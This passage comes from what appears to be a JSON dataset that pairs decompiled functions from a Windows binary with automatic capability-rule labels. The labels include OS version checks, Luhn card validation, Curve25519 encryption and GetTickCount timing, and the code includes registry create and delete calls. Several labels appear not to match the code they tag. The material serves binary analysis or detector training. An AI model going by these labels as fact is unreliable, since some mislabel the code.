0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xab8) << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                    }\n                    if (*(in_EAX + 0x16b8) < 0xf) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 2;\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 - 3U << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (iVar4 - 3U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xe;\n                    }\n                }\n                iVar4 = 0;\n                uStack44 = uVar5;\n                if (uVar6 == 0) {\n                    iVar2 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar2 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    iVar7 = 4;\n                }\n            }\n            iStack48 = iStack48 + 1;\n            puStack20 = puStack20 + 2;\n            iVar3 = iVar4;\n            uVar5 = uVar6;\n        } while (iStack48 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 3796
    },
    "00483844": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00483844(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 8) {\n        fcn.00405584();\n        return;\n    }\n    if (in_EAX == 0xd) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 0x18) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 10) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 6) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 4) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "00403ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ec4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403f3a:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403f4a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403f4a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00403f4f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00403f43;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00403f43;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403f8c:\n                iVar7 = 0;\n                goto code_r0x00403f8f;\n            }\n            goto code_r0x00403f3a;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403f16;\n            goto code_r0x00403f43;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00403f4f;\n        while (uVar3 != 0) {\ncode_r0x00403f16:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00403f43;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403f8c;\n        }\n        else if (-1 < uVar2) goto code_r0x00403f8c;\n    }\ncode_r0x00403f43:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00403f8f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 876
    },
    "0040c968": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c968(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040c944();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 282
    },
    "0041d060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint32_t fcn.0041d060(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041eb40();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 55
    },
    "0042b708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042b708(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42b722;\n    var_8h = fcn.0042935c();\n    uStack48 = 0x42b7e7;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.00429930();\n    fcn.00425054();\n    fcn.00424f38();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042b708::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00418438(arg_8h, arg_ch);\n    fcn.004252dc();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.0042564c(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.004295ec();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 539
    },
    "0042c818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c818(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040dba8();\n        arg_ch = fcn.00404ec4();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.0042c800();\n    }\n    fcn.0042c720(&var_104h);\n    if (arg_8h != 0) {\n        fcn.0041162c();\n    }\n    fcn.0042c3b0(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 226
    },
    "00473388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.00473388(void)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    uVar2 = *0x491cf0;\n    uVar3 = str._a__a__a__a[0];\n    if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491cf0 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491cf0 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n    }\n    fcn.00473e54();\n    iVar1 = *(in_EAX + 0x16b8);\n    if ((*(in_EAX + 0x16b0) + 0xb) - iVar1 < 9) {\n        if (iVar1 < 0xe) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (iVar1 & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n        }\n        uVar2 = *0x491cf0;\n        uVar3 = str._a__a__a__a[0];\n        if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491cf0 << (*(in_EAX + 0x16b8) & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491cf0 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n        }\n        fcn.00473e54();\n    }\n    *(in_EAX + 0x16b0) = 7;\n    return;\n}\n",
        "token_count": 1672
    },
    "0041d970": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041d970(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041eb40();\n    if (cVar1 == '\\x05') {\n        fcn.0041cfd8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.0041d9a8();\n    }\n    return Stack16;\n}\n",
        "token_count": 124
    },
    "004518bc": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004518bc(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 247
    },
    "004683c8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004683c8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4683dc;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x4683e4;\n    fcn.004059cc();\n    uStack24 = 0x46853a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409ecc();\n    // switch table (6 cases) at 0x46840a\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.004683c8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x468541);\n    return;\n}\n",
        "token_count": 681
    },
    "00468548": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00468548(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46855f;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack24 = 0x468567;\n    fcn.004059cc();\n    puStack24 = 0x46856f;\n    fcn.004059cc();\n    uStack28 = 0x4686a4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = fcn.00409ecc();\n    // switch table (6 cases) at 0x468595\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.00468548::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    uVar1 = fcn.004059dc();\n    sub.advapi32.dll_RegDeleteValueA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x4686ab);\n    return;\n}\n",
        "token_count": 667
    },
    "004686b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004686b0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4686c4;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x4686cc;\n    fcn.004059cc();\n    uStack24 = 0x4687fd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409ecc();\n    // switch table (6 cases) at 0x4686f2\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.004686b0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegDeleteKeyA(hKey, 0x468808);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x468804);\n    return;\n}\n",
        "token_count": 641
    },
    "00404448": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404448(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x48f024;\n    puStack20 = &fcn.00404448::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x4044e0;\n    uStack36 = 0x80000002;\n    puStack40 = 0x40446f;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4044b9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x4044fc, 0, 0, &fcn.00404448::var_8h, &fcn.00404448::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x4044c0);\n        return;\n    }\n    *0x48f024 = *0x48f024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 399
    },
    "0045eac4": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045eac4(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10);\n    *(in_EAX + 0x10) = *(in_EAX + 0x10) + param_1;\n    if (*(in_EAX + 0x10) <= uVar1 && uVar1 != *(in_EAX + 0x10)) {\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    }\n    uVar1 = 0x40 - (uVar1 & 0x3f);\n    if (param_1 < uVar1) {\n        fcn.004030fc();\n    }\n    else {\n        fcn.004030fc();\n        fcn.0045ebe8();\n        for (param_1 = param_1 - uVar1; 0x3f < param_1; param_1 = param_1 - 0x40) {\n            fcn.004030fc();\n            fcn.0045ebe8();\n        }\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0045eb58": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.0045eb58(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10) & 0x3f;\n    *(in_EAX + 0x18 + uVar1) = 0x80;\n    if (0x37 - uVar1 < 0) {\n        fcn.00403af4();\n        fcn.0045ebe8();\n    }\n    fcn.00403af4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x10) * 8;\n    *(in_EAX + 0x54) = *(in_EAX + 0x14) * 8 | *(in_EAX + 0x10) >> 0x1d;\n    fcn.0045ebe8();\n    fcn.004030fc();\n    fcn.00403af4();\n    return;\n}\n",
        "token_count": 217
    },
    "0040dcec": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040dcec(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.004030dc();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x48f938))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040daec();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040dbe4(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 179
    },
    "00453c84": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00453c84(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x453caa\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 554
    },
    "004241b0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004241b0(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "0046f120": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
